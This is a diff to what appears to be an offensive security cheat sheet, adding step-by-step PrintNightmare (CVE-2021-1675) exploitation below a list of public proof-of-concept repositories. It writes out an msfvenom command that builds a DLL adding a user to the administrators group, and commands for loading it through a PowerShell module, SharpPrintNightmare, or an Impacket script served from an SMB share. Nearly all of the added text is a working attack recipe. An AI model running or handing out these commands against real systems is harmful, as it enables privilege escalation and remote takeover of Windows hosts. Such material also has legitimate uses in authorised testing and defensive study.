@@ -467,6 +467,26 @@ Available POC can be found here
 | https://github.com/cube0x0/CVE-2021-1675      | [@cube0x0](https://twitter.com/cube0x0) | python, c# |
 | https://github.com/calebstewart/CVE-2021-1675      | [@calebsteward](https://twitter.com/calebjstewart)      |  PowerShell |
 
+1. Generate `msfvenom` payload
+```
+msfvenom -p windows/x64/exec CMD="net.exe localgroup administrators testuser /add" -f dll -o test.dll
+```
+
+2. Run these commands _(either one)_
+```
+# Powershell
+Import-Module .\cve-2021-1675.ps1
+Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
+
+# SharpPrintNightMare
+SharpPrintNightmare.exe C:\Windows\Tasks\execme.dll
+
+# Python Impacket Implementation
+## setup smbserver
+smbserver.py smbshare `pwd` -smb2support
+python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10\smbshare\encme.dll' [-hashes :NTLM]
+```
+
 ## File Transfer
 
 | **Command** | **Description** |
